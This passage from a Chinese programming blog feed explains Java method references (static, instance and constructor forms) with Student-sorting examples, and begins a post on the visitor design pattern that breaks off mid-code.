</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(<span class="keyword">int</span> id, String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面我们再来谈谈和函数接口紧密相连的方法引用。</p><h2 id="3-方法引用"><a href="#3-方法引用" class="headerlink" title="3. 方法引用"></a>3. 方法引用</h2><h3 id="3-1-为什么要用方法引用"><a href="#3-1-为什么要用方法引用" class="headerlink" title="3.1 为什么要用方法引用"></a>3.1 为什么要用方法引用</h3><p>让我们再看看刚才那个根据学号排序学生的例子，只不过这次我在student类中添加一个新的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComparatorExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student[] stus = <span class="keyword">new</span> Student[]&#123;</span><br><span class="line">                <span class="keyword">new</span> Student(<span class="number">12</span>,<span class="string">&quot;法外狂徒张三&quot;</span>),</span><br><span class="line">                <span class="keyword">new</span> Student(<span class="number">123</span>,<span class="string">&quot;李四&quot;</span>),</span><br><span class="line">                <span class="keyword">new</span> Student(<span class="number">4</span>,<span class="string">&quot;王五&quot;</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Comparator&lt;Student&gt; comparator = (stu1,stu2)-&gt;&#123;</span><br><span class="line">            <span class="keyword">return</span> Student.compareTo(stu1,stu2);</span><br><span class="line">        &#125;;</span><br><span class="line">        Arrays.sort(stus,comparator);</span><br><span class="line">        </span><br><span class="line">        Stream.of(stus).forEach(System.out::print);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Student stu1, Student stu2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stu1.getId() - stu2.getId();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样同样能实现效果，现在我们仅看这一句话：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Comparator&lt;Student&gt; comparator = (stu1,stu2)-&gt;&#123;</span><br><span class="line">    <span class="keyword">return</span> Student.compareTo(stu1,stu2);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这一个labmda表达式非常简单，<strong>当lambda内部出了调用一个函数以外什么也不做时，我们就可以考虑使用方法引用。</strong></p><p>使用方法引用来改造上面的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComparatorExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student[] stus = <span class="keyword">new</span> Student[]&#123;</span><br><span class="line">                <span class="keyword">new</span> Student(<span class="number">12</span>,<span class="string">&quot;法外狂徒张三&quot;</span>),</span><br><span class="line">                <span class="keyword">new</span> Student(<span class="number">123</span>,<span class="string">&quot;李四&quot;</span>),</span><br><span class="line">                <span class="keyword">new</span> Student(<span class="number">4</span>,<span class="string">&quot;王五&quot;</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Comparator&lt;Student&gt; comparator = Student::compareTo;</span><br><span class="line">        Arrays.sort(stus,comparator);</span><br><span class="line">        <span class="comment">// 或者直接： Arrays.sort(stus,Student::compareTo);</span></span><br><span class="line">        <span class="comment">// print result</span></span><br><span class="line">        Stream.of(stus).forEach(System.out::print);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时Student::compareTo等价于lambda表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(stu1,stu2)-&gt;&#123;</span><br><span class="line">           <span class="keyword">return</span> Student.compareTo(stu1,stu2);</span><br><span class="line">       &#125;;</span><br></pre></td></tr></table></figure><p>仔细思考一下它们之间的相似点。</p><p>yes，<strong>他们的参数是相同</strong>（数量，类型）。</p><p>上面我所展示的只不过是3种方法引用的其中一种，这3种分别是：</p><ol><li>Reference to a static method. 静态方法引用</li><li>Reference to an instance method. 实例方法引用</li><li>Reference to a constructor. 构造器引用</li></ol><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/types-of-method-references.jpg" alt="Types of Java Method References"></p><p>别被三种方式吓到了，看到<strong>总结</strong>后，你会发现其实很好区别。</p><h3 id="3-2-静态方法引用"><a href="#3-2-静态方法引用" class="headerlink" title="3.2 静态方法引用"></a>3.2 静态方法引用</h3><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ContainingClass::staticMethodName  </span><br></pre></td></tr></table></figure><p>现在我们来解释一下之前学生排序的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Comparator&lt;Student&gt; comparator = Student::compareTo;</span><br><span class="line">Arrays.sort(stus,comparator);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line">Arrays.sort(stus,Student::compareTo);</span><br></pre></td></tr></table></figure><p>我们来看看Arrays.sort的方法签名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(T[] a, Comparator&lt;? <span class="keyword">super</span> T&gt; c)</span></span></span><br></pre></td></tr></table></figure><p>Compator这里作为函数接口，它的签名是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(T o1, T o2)</span></span>;</span><br></pre></td></tr></table></figure><p>记住，它是两个参数。</p><p>再看看Student::compareTo,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Student stu1, Student stu2)</span></span></span><br></pre></td></tr></table></figure><p>也是两个参数。</p><p>也就是说静态方法引用，只要函数接口和静态方法的参数一一对应即可。</p><h3 id="3-3-实例方法引用"><a href="#3-3-实例方法引用" class="headerlink" title="3.3 实例方法引用"></a>3.3 实例方法引用</h3><p>实例方法引用又分两种：</p><h4 id="3-3-1-特定实例的方法引用"><a href="#3-3-1-特定实例的方法引用" class="headerlink" title="3.3.1 特定实例的方法引用"></a>3.3.1 特定实例的方法引用</h4><p>语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">containingObject::instanceMethodName  </span><br></pre></td></tr></table></figure><ol><li>简单例子：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">startWithB</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str.startsWith(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List&lt;String&gt; list = Arrays.asList( <span class="string">&quot;Barbara&quot;</span>, <span class="string">&quot;James&quot;</span>, <span class="string">&quot;Mary&quot;</span>, <span class="string">&quot;John&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Patricia&quot;</span>, <span class="string">&quot;Robert&quot;</span>, <span class="string">&quot;Michael&quot;</span>, <span class="string">&quot;Linda&quot;</span>);</span><br><span class="line">Filter myFilter = <span class="keyword">new</span> Filter();</span><br><span class="line">List&lt;String&gt; collect = list.stream().filter(myFilter::startWithB).collect(Collectors.toList());</span><br><span class="line">collect.forEach(System.out::println);</span><br></pre></td></tr></table></figure><p>这里有两个地方都用到了实例方法引用：</p><ol><li>list.stream().filter(myFilter::startWithB)。 myFilter::startWithB</li><li>collect.forEach(System.out::println);  </li></ol><p>这里进说明第一个：</p><p>Filter是自定义的类，内部有一个方法。签名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">startWithB</span><span class="params">(String str)</span></span></span><br></pre></td></tr></table></figure><p>filter:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Stream&lt;T&gt; <span class="title">filter</span><span class="params">(Predicate&lt;? <span class="keyword">super</span> T&gt; predicate)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Predicate</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">test</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以也就是test(T t)中t传给了startWithB（String str)中的str。</p><h4 id="3-3-2-引用特定类型的任意对象的实例方法"><a href="#3-3-2-引用特定类型的任意对象的实例方法" class="headerlink" title="3.3.2 引用特定类型的任意对象的实例方法"></a>3.3.2 引用特定类型的任意对象的实例方法</h4><p><strong>这是方法引用中最难理解的一种。</strong></p><p>现在看这个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] stringArray = &#123; <span class="string">&quot;Barbara&quot;</span>, <span class="string">&quot;James&quot;</span>, <span class="string">&quot;Mary&quot;</span>, <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Patricia&quot;</span>, <span class="string">&quot;Robert&quot;</span>, <span class="string">&quot;Michael&quot;</span>, <span class="string">&quot;Linda&quot;</span> &#125;;</span><br><span class="line">Arrays.sort(stringArray, String::compareToIgnoreCase);<span class="comment">// String::xx 这里不是静态方法，而是作为方法实例在使用</span></span><br></pre></td></tr></table></figure><p>现在我们来比较一下参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Comparator</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(T o1, T o2)</span></span>;</span><br><span class="line"><span class="comment">// String::compareToIgnoreCase</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareToIgnoreCase</span><span class="params">(String str)</span></span></span><br></pre></td></tr></table></figure><p>这种情况是怎么回事？</p><p>这种方式等价于:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compareToIgnoreCase</span><span class="params">(String str2)</span> &lt;</span>==&gt; (String str1, String str2) -&gt; &#123; <span class="keyword">return</span> str1.compareToIgnoreCase(str2);&#125;</span><br><span class="line"><span class="comment">// 传入的第一个参数作为调用者，第二个参数作为真正的compareToIngnoreCase的参数</span></span><br></pre></td></tr></table></figure><p>为什么会这样呢?</p><p>这其实又是一个很大的话题。总结下来，就两句话：</p><ul><li><p>第一点：<strong>接口方法的参数比引用方法的参数多一个</strong></p></li><li><p>第二点：<strong>接口方法的第一个参数恰巧是调用引用方法的对象（其引用方法所在类或其父类的实例）</strong></p></li></ul><p>具体可参考：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTEyNjMwMy9hcnRpY2xlL2RldGFpbHMvODExODcwMDI=" title="https://blog.csdn.net/weixin_41126303/article/details/81187002">点这里<i class="fa fa-external-link"></i></span></p><p><strong>实际开发中，不推荐这种方式！</strong></p><h3 id="3-4-构造方法"><a href="#3-4-构造方法" class="headerlink" title="3.4 构造方法"></a>3.4 构造方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里对应的是Student的默认构造函数</span></span><br><span class="line">Supplier&lt;Student&gt; supplier = Student::<span class="keyword">new</span>; </span><br><span class="line"><span class="comment">// 下面看一个非默认构造函数</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">MyFunction</span>&lt;<span class="title">T</span>,<span class="title">U</span>,<span class="title">R</span>&gt;</span>&#123;</span><br><span class="line">    <span class="function">R <span class="title">apply</span><span class="params">(T t,U u)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(<span class="keyword">int</span> id, String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 此时对应的是Student(int id, String name)构造函数</span></span><br><span class="line"> MyFunction&lt;Integer,String,Student&gt; myFunction = Student::<span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用：</span></span><br><span class="line">MyFunction&lt;Integer,String,Student&gt; myFunction = Student::<span class="keyword">new</span>;</span><br><span class="line">Student stu = myFunction.apply(<span class="number">1</span>,<span class="string">&quot;raven&quot;</span>);</span><br><span class="line">System.out.println(stu);</span><br></pre></td></tr></table></figure><h2 id="3-5-方法引用总结"><a href="#3-5-方法引用总结" class="headerlink" title="3.5 方法引用总结"></a>3.5 方法引用总结</h2><ol><li>静态方法引用 参数一一对应</li><li>实例方法引用<ol><li>特定实例的方法引用， 参数一一对应</li><li>引用特定类型的任意对象，函数接口应该比方法引用多一个参数，且这个参数是对应的类型（或父类型）。很难理解，很不推荐使用。另一种理解方式</li></ol></li><li>构造器，参数一一对应</li></ol><p>再引用知乎某大佬的理解方式：</p><p>原文链接:<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82OTk4NTEyMA==" title="https://zhuanlan.zhihu.com/p/69985120">https://zhuanlan.zhihu.com/p/69985120<i class="fa fa-external-link"></i></span> </p><p><strong>在评论中找下面的话，原文不要看。</strong></p><blockquote><p>lambda 内部使用 MethodHandle，所以其实方法引用的处理规则跟 MethodHandle 是一模一样的。</p><p>以 PrintStream::println 这个方法引用为例，它实际上调用的方法是 PrintStream 里的 void println(String)，但因为它是成员方法，所以内部处理时的使用的方法签名实际上是 (PrintStream, String)void，即把 this 作为第一个传入参数。</p><p>因此知道这个规律后，就能明白 String::compareToIgnoreCase 是怎么回事了——它的方法签名为 (String, String)int，参数列表增加了 this（在这里就是一个 String）后刚好符合了 Comparator<String> 接口里 int compareTo(String, String) 的要求，因此可以作为 Arrays.sort(String[], Comparator<String>) 的参数。</p><p>静态方法没有 this，所以方法签名该是怎么样还是怎么样。比如 String valueOf(int) 的签名就是 (int)String。</p><p>当 :: 前面不是一个类型，而是一个对象，比如 “a”::equals 的时候，JDK 在生成 lambda 实例时会自动把目标对象给 bindTo 到对应的 MethodHandle 上。意思是：原来 String::equals 的方法签名根据上一段提到的规则是 (String, Object)boolean，但因为 :: 前面是一个 String 实例 “a”，因此方法引用的第一个参数（在这里就是 this）被绑定为了 “a”，方法签名变成了 (Object)boolean（因为原先第一个 String 参数被绑定成 “a” 了，它的值永远不会改变了，所以就只剩下 (Object)boolean 了）。这个改变后的签名就符合了 Predicate 接口里 boolean test(Object) 的要求。</p><p>总结一下的话，三条规则就能说清楚了：</p><ol><li>成员方法的方法签名，前面会追加 this 的类型。</li><li>静态方法的方法签名，因为没有 this, 不会追加任何东西。</li><li>当 :: 前是一个实例时，这个实例会作为第一个参数给绑定到目标方法签名上。</li></ol></blockquote><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTEyNjMwMy9hcnRpY2xlL2RldGFpbHMvODExODcwMDI=" title="https://blog.csdn.net/weixin_41126303/article/details/81187002">https://blog.csdn.net/weixin_41126303/article/details/81187002<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cDovL3p5emhhbmcuZ2l0aHViLmlvL2Jsb2cvMjAxMy8wNi8xNS9qYXZhOC1wcmV2aWV3LW1ldGhvZC1yZWZlcmVuY2Uv" title="http://zyzhang.github.io/blog/2013/06/15/java8-preview-method-reference/">http://zyzhang.github.io/blog/2013/06/15/java8-preview-method-reference/<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cDovL21vYW5kamllemFuYS5jb20vYmxvZy8yMDE0L3VuZGVyc3RhbmRpbmctbWV0aG9kLXJlZmVyZW5jZXMv" title="http://moandjiezana.com/blog/2014/understanding-method-references/">http://moandjiezana.com/blog/2014/understanding-method-references/<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlL3R1dG9yaWFsL2phdmEvamF2YU9PL21ldGhvZHJlZmVyZW5jZXMuaHRtbA==" title="https://docs.oracle.com/javase/tutorial/java/javaOO/methodreferences.html">https://docs.oracle.com/javase/tutorial/java/javaOO/methodreferences.html<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmFlbGR1bmcuY29tL2phdmEtbWV0aG9kLXJlZmVyZW5jZXM=" title="https://www.baeldung.com/java-method-references">https://www.baeldung.com/java-method-references<i class="fa fa-external-link"></i></span></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 函数接口 </tag>
            
            <tag> 方法引用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式-访问者模式</title>
      <link href="/archives/b07c35a8.html"/>
      <url>/archives/b07c35a8.html</url>
      
        <content type="html"><![CDATA[<p>这个模式，韩老师讲得非常不好。所以本文整理自各种博文。</p><h2 id="1-为什么使用？"><a href="#1-为什么使用？" class="headerlink" title="1.为什么使用？"></a>1.为什么使用？</h2><p>当需要对一个对象结构类（这个结构由一些不相关的类组成）进行操作扩展，而又不想改变这个对象结构类时，可以考虑使用<strong>访问者模式</strong>。</p><p>举个案例，假设现在我们有一个描述商品的对象结构（想象成购物篮），当前装入了书和水果。那么现在这个结构看起来像这个样子：</p><a id="more"></a><p><img data-src="https://pic.downk.cc/item/5e8e9f00504f4bcb04f69a73.png"></p><p>现在超市由于促销活动，对大于500页的书，打8折活动；水果每买一斤，单位价格下降1%。于是很自然地想到在Book类和Fruit分别添加getPrice方法和buy3Get1()方法，然后实现具体的操作。如下：</p><p><img data-src="https://pic.downk.cc/item/5e8ea13d504f4bcb04f8d145.jpg"></p><p>这里我只分别对Book和Fruit做了一个操作扩展，考虑如果我们要对Book和Fruit做多个扩展呢？每个扩展我们都要打开实际的Book类或Fruit类来修改吗？这<strong>显然违反了ocp原则，不便于扩展和维护</strong>。</p><p><strong>虽然Book和Fruit都是商品, 但是它们在打折行为上是相互独立的</strong>，这种情况我们该如何去扩展呢？下面就来介绍如何使用访问者模式解决这个问题。</p><h2 id="2-介绍是什么？"><a href="#2-介绍是什么？" class="headerlink" title="2.介绍是什么？"></a>2.介绍是什么？</h2><p>第2部分如果没看懂，没关系，粗略过一下，看完实例再看一遍第2部分应该就懂了。</p><h3 id="2-1-基本介绍"><a href="#2-1-基本介绍" class="headerlink" title="2.1 基本介绍"></a>2.1 基本介绍</h3><p>访问者设计模式是行为设计模式之一。 当我们必须对一组相似类型但的对象执行操作时，可以使用它。 借助访问者模式，我们可以将<strong>操作逻辑从对象移动到另一个类</strong>。</p><p>访问者模式由两部分组成：</p><ol><li>Visitor类：visitor类定义visit方法，这个方法将被所有对象结构中的元素调用。</li><li>被访问类，即对象结构中的元素，提供一个accpet方法，接受一个Visitor类。</li></ol><h3 id="2-2-类图"><a href="#2-2-类图" class="headerlink" title="2.2 类图"></a>2.2 类图</h3><p><img data-src="https://pic.downk.cc/item/5e8e9f47504f4bcb04f6f0c4.png"></p><p>职责介绍：</p><ul><li>Client：Client类是访问者设计模式使用者。 它有权访问对象结构对象，并可以指示它们接受访问者者以执行适当的处理。</li><li>Visitor：这是一个接口或抽象类，用于声明所有可访问类类型的访问操作。</li><li>ConcreteVisitor：对于每种类型的访问者，必须实现在所有具体访问方法。 每个访问者将负责不同的操作。</li><li>Visitable：这是一个声明接受操作的接口。 这是使访问者对象可以“访问”对象的入口点。</li><li>ConcreteVisitable：这些类实现Visitable接口或类并定义接受操作。 使用accept操作将访问者对象传递给该对象。</li></ul><p>OK，大概你已经有点晕了，来看实例吧。</p><h2 id="3-如何使用？"><a href="#3-如何使用？" class="headerlink" title="3.如何使用？"></a>3.如何使用？</h2><p>我们先给出利用访问者模式解决“为什么要使用”中的不易扩展的问题的类图：</p><p><img data-src="https://pic.downk.cc/item/5e8e9f58504f4bcb04f70557.png"></p><p>Book和Fruit都是商品，所以抽象出一个父类或接口，作为Visitable（被访问者），声明一个accept。</p><p>这里就以接口的方式作为讲解：</p><p>被访问者接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 作为被访问者的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Goods</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">accept</span><span class="params">(Visitor visitor)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问者接口:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Visitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">saleCountOnBook</span><span class="params">(Book book)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">saleCountOnFruit</span><span class="params">(Fruit fruit)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也许你会问，Book和Fruit都是Goods，<strong>根据依赖倒转原则，不是应该依赖高层抽象吗。</strong>不然的话，每增加一个具体的商品，就会增加一个方法。<strong>下文会对这个做解释。</strong></p><p>具体的被访问者，Book和Fruit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Book</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> <span class="keyword">implements</span> <span class="title">Goods</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> price;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> page;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrice</span><span class="params">(<span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPage</span><span class="params">(<span class="keyword">int</span> page)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.page = page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> 